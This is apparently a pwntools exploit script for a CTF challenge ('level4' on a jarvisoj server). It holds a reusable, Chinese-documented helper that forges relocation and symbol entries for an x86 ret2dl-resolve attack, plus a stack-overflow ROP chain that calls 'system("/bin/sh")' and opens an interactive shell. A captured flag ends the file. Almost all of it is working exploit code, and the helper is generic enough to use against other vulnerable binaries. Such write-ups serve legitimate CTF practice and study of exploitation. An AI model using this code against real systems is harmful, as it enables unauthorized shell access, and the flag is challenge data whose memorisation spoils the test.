#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
"""

import sys
import re
from os import path
from pwn import *
from pwnlib import gdb
from pwnlib.replacements import sleep

context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level4")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9880")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


# 封装一个函数，用于一步生成x86 ret2dl-resolve攻击payload
def ret2dl_x86(elf_obj, dst_addr, func_name="read", shell=b"/bin/sh\0"):
    """生成ret2dl攻击载荷

    生成一个ret2dl-resolve(x86)攻击的载荷。
    攻击通常需要满足以下条件：
        1. 二进制程序属于x86体系
        2. 程序延迟链接libc
        3. 应存在read函数（因为payload中带有“\x00”）

    Args:
        elf_obj: ELF_OBJECT
            二进制文件的对象。通常在一开始用“elf = ELF(<binary>)”这样的语句创建。
        dst_addr: int
            payload所保存的具体地址，一般在bss段上。
            注意：该函数仅生成payload，并不会被写入该地址。需要用户用其他方法将payload写入该地址。
        func_name: str(bytes)
            所攻击的目标函数。
            只要got表中有的函数，比如“read”。
            默认为“read”
        shell: str(bytes)
            最终调用的外部程序。
            该字符串最好以“\0”结尾，但“;”，“||”等说不定也可以。
            默认为“/bin/sh\0”。

    Returns:
        返回一个元组，其中包括内容为：
        (payload, plt0, fake_reloc_arg, shell_addr)

        payload: str(bytes)
            攻击载荷
        plt0: int
            寻址函数入口
        fake_reloc_arg: int
            寻址函数参数
        shell_addr: int
            shell存在的具体地址
        
        在栈上的使用方式：
            p32(plt0) + p32(fake_reloc_arg) + p32(0xdeadbeef) + p32(shell_addr)
    """
    assert func_name in elf_obj.got
    plt0 = elf_obj.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf_obj.get_section_by_name('.rel.plt').header.sh_addr
    dynsym = elf_obj.get_section_by_name('.dynsym').header.sh_addr
    dynstr = elf_obj.get_section_by_name('.dynstr').header.sh_addr
    versym = elf_obj.dynamic_value_by_tag("DT_VERSYM")

    fake_reloc_addr = dst_addr
    fake_st_name_addr = fake_reloc_addr + 8
    st_name = "system\0"
    sh_addr = fake_st_name_addr + len(st_name)
    fake_sym_addr = sh_addr + len(shell)
    t = (fake_sym_addr - dynsym) & 0xf
    fake_sym_padding = 0 if t == 0 else 0x10 - t
    fake_sym_addr += fake_sym_padding
    assert (fake_sym_addr - dynsym) & 0xf == 0  # sym结构长度0x10，所以在内存中必须按0x10对齐
    fake_sym_index = (fake_sym_addr - dynsym) // 0x10
    # ndx必须为0，否则在绑定时会出错。向后搜索直到ndx为0为止
    while 1:
        fake_ndx = u16(elf_obj.read(fake_sym_index * 2 + versym, 2))
        if fake_ndx != 0:
            fake_sym_index += 1
            fake_sym_padding += 0x10
        else:
            break

    r_info = fake_sym_index << 8 | 0x7
    fake_reloc = p32(elf_obj.got[func_name]) + p32(r_info)
    fake_reloc_offset = fake_reloc_addr - rel_plt
    fake_st_name_offset = fake_st_name_addr - dynstr
    fake_sym = p32(fake_st_name_offset) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)
    payload = flat((
        fake_reloc,
        st_name,
        shell,
        b"~" * fake_sym_padding,
        fake_sym,
    ))
    return payload, plt0, fake_reloc_offset, sh_addr



def main():
    POP3 = 0x08048509
    ret2dl_payload, plt0, fake_reloc_offset, sh_addr = ret2dl_x86(elf, elf.bss())
    payload = flat((
        '!' * (0x88 + 4),
        elf.sym["read"],
        POP3,
        0, elf.bss(), len(ret2dl_payload),
        plt0,
        fake_reloc_offset,
        0xdeadbeef,
        sh_addr,
    ))
    io.send(payload)
    sleep(0.5)
    io.send(ret2dl_payload)

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{882130cf51d65fb705440b218e94e98e}
